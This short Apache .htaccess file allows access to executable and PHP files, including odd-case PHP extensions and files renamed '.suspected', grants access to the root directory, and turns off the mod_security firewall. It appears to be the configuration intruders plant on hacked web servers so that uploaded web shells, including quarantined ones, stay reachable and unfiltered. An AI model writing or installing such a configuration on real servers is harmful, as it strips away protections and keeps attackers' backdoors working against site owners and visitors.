<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
Order allow,deny
Allow from all
</FilesMatch>
<Directory />
    AllowOverride All
    Require all granted
    Satisfy Any
</Directory>

# Disable mod_security if enabled
<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>
